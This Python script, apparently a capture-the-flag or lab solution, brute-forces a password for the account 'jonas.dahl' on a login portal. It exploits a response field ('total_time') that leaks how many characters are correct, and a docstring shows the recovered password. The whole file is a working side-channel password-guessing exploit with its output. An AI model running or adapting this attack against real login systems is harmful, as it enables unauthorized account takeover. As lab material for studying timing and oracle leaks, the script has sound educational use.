import requests
import string

def login(pw):
    data = {
            "username": "jonas.dahl",
            "password": pw
        }
    response = requests.post(
        url=url,
        json=data
    )
    if response.ok:
        if response.text != "":
            return response.json()
        return pw
    return None


url = "https://portal.regjeringen.uiaikt.no/login"
pw_length = 0
time = 0

# Find the password lenght
while time == 0:
    pw_length += 1
    pw = "*" * pw_length
    result = login(pw)
    if result:
        time = result.get("total_time")

print(f'The password has {pw_length} characters')

chars = string.ascii_letters+string.digits
pw_found = False

# Find the password
while time <= pw_length+1:
    if pw_found:
        break
    index = time-1
    # Try all the characters
    for c in chars:
        # Replace the character at index
        pw_list = list(pw)
        pw_list[index] = c
        pw = "".join(pw_list)

        # Try the password
        result = login(pw)
        if result:
            if result == pw:
                pw_found = True
                print(f'The password is {pw}')
                break
            # Check and potentially increase time
            new_time = result.get("total_time")
            if new_time > time:
                print(pw)
                time = new_time
                # Move to next character
                break


"""
Output:

The password has 17 characters
K****************
Ka***************
Kat**************
Katt*************
Katte************
Katten***********
KattenM**********
KattenMi*********
KattenMin********
KattenMinE*******
KattenMinEr******
KattenMinErK*****
KattenMinErKu****
KattenMinErKul***
KattenMinErKul1**
The password is KattenMinErKul12*

"""
